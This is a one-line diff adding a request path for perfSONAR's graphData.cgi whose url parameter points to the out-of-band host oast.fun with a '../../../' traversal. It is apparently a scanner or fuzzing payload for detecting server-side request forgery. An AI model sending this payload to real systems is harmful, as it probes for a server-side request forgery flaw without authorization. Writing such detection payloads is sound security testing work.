@@ -1,0 +1,1 @@
+/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://oast.fun/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4
